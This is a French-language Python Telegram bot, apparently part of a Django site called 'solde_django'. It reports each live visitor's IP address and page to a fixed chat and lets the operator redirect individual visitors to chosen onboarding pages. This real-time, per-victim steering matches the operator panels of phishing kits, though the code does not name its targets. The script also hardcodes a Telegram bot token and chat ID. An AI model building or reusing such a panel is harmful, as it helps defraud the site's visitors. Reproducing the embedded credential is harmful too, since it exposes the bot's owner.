import requests
import time
import django
import os

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'solde_django.settings')
django.setup()

from django.core.cache import cache
from onboarding.middleware import PAGES_DISPONIBLES

TOKEN = '8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8'
CHAT_ID = '8849728706'
BASE_URL   = f"https://api.telegram.org/bot{TOKEN}"
SERVEUR    = "http://127.0.0.1:8000"
INTERVALLE = 10

MESSAGE_LIVE_ID = None


def get_visiteurs():
    try:
        res = requests.get(f"{SERVEUR}/visiteurs/json/", timeout=5)
        return res.json().get('visiteurs', [])
    except Exception as e:
        print(f"Erreur get_visiteurs : {e}")
        return []


def envoyer(texte, boutons=None):
    data = {"chat_id": CHAT_ID, "text": texte, "parse_mode": "Markdown"}
    if boutons:
        data["reply_markup"] = {"inline_keyboard": boutons}
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json=data, timeout=5)
        return res.json().get('result', {}).get('message_id')
    except Exception as e:
        print(f"Erreur envoyer : {e}")
        return None


def supprimer(msg_id):
    try:
        requests.post(f"{BASE_URL}/deleteMessage", json={
            "chat_id": CHAT_ID, "message_id": msg_id
        }, timeout=5)
    except Exception:
        pass


def epingler(msg_id):
    try:
        requests.post(f"{BASE_URL}/pinChatMessage", json={
            "chat_id": CHAT_ID,
            "message_id": msg_id,
            "disable_notification": True
        }, timeout=5)
    except Exception:
        pass


def repondre_callback(callback_id):
    try:
        requests.post(f"{BASE_URL}/answerCallbackQuery",
                      json={"callback_query_id": callback_id}, timeout=5)
    except Exception:
        pass


def mettre_a_jour_live():
    global MESSAGE_LIVE_ID
    visiteurs = get_visiteurs()

    if not visiteurs:
        return

    lignes  = [f"👥 *{len(visiteurs)} visiteur(s) en ligne :*\n━━━━━━━━━━━━━━━"]
    boutons = []
    for v in visiteurs:
        ip     = v['ip']
        page   = v['page']
        il_y_a = v['il_y_a']
        lignes.append(f"📍 `{ip}` → `{page}` ⏱ {il_y_a}s")
        boutons.append([{"text": f"➡️ Rediriger {ip}", "callback_data": f"ip:{ip}"}])
    texte = '\n'.join(lignes)

    if MESSAGE_LIVE_ID:
        supprimer(MESSAGE_LIVE_ID)
        MESSAGE_LIVE_ID = None

    msg_id = envoyer(texte, boutons)
    if msg_id:
        MESSAGE_LIVE_ID = msg_id
        epingler(msg_id)


def traiter(update):
    global MESSAGE_LIVE_ID

    if 'message' in update:
        message = update['message']
        texte   = message.get('text', '').strip()
        chat_id = str(message.get('chat', {}).get('id', ''))
        if chat_id != CHAT_ID:
            return

        if texte in ('/start', '/help'):
            envoyer(
                "🤖 *Commandes :*\n"
                "━━━━━━━━━━━━━━━\n"
                "👥 `/visiteurs` — voir les visiteurs\n"
                "➡️ `/redirect` — rediriger un visiteur\n"
                "📌 `/live` — démarrer le live"
            )

        elif texte == '/live':
            MESSAGE_LIVE_ID = None
            mettre_a_jour_live()

        elif texte == '/visiteurs':
            visiteurs = get_visiteurs()
            if not visiteurs:
                envoyer("😴 *Aucun visiteur actif*")
            else:
                lignes  = [f"👥 *{len(visiteurs)} visiteur(s) en ligne :*\n━━━━━━━━━━━━━━━"]
                boutons = []
                for v in visiteurs:
                    ip     = v['ip']
                    page   = v['page']
                    il_y_a = v['il_y_a']
                    lignes.append(f"📍 `{ip}` → `{page}` ⏱ {il_y_a}s")
                    boutons.append([{"text": f"➡️ Rediriger {ip}", "callback_data": f"ip:{ip}"}])
                envoyer('\n'.join(lignes), boutons)

        elif texte == '/redirect':
            visiteurs = get_visiteurs()
            if not visiteurs:
                envoyer("😴 *Aucun visiteur actif*")
            else:
                boutons = []
                for v in visiteurs:
                    ip   = v['ip']
                    page = v['page']
                    boutons.append([{"text": f"📍 {ip} ({page})", "callback_data": f"ip:{ip}"}])
                envoyer("👥 *Choisis le visiteur :*", boutons)

    elif 'callback_query' in update:
        callback = update['callback_query']
        chat_id  = str(callback['message']['chat']['id'])
        data     = callback.get('data', '')
        msg_id   = callback['message']['message_id']
        if chat_id != CHAT_ID:
            return

        if data.startswith('ip:'):
            ip = data.split(':', 1)[1]
            boutons = []
            for url, nom in PAGES_DISPONIBLES:
                boutons.append([{"text": f"🔗 {nom}", "callback_data": f"redirect:{ip}:{url}"}])
            boutons.append([{"text": "❌ Annuler", "callback_data": "annuler"}])
            supprimer(msg_id)
            envoyer(f"📍 IP : `{ip}`\n➡️ *Choisis la page :*", boutons)

        elif data.startswith('redirect:'):
            _, ip, destination = data.split(':', 2)
            cache.set(f'redirect_{ip}', destination, timeout=300)
            supprimer(msg_id)
            envoyer(
                f"✅ *Redirection envoyée !*\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📍 IP : `{ip}`\n"
                f"➡️ Vers : `{destination}`"
            )

        elif data == 'annuler':
            supprimer(msg_id)
            envoyer("❌ *Annulé*")

        repondre_callback(callback['id'])


print("✅ Bot démarré en mode polling...")
offset       = 0
dernier_live = 0

while True:
    try:
        if time.time() - dernier_live > INTERVALLE:
            mettre_a_jour_live()
            dernier_live = time.time()

        res = requests.get(
            f"{BASE_URL}/getUpdates",
            params={"offset": offset, "timeout": 5},
            timeout=10
        ).json()

        for update in res.get('result', []):
            offset = update['update_id'] + 1
            traiter(update)

    except KeyboardInterrupt:
        print("\nBot arrêté.")
        break
    except Exception as e:
        print(f"Erreur : {e}")
        time.sleep(5)
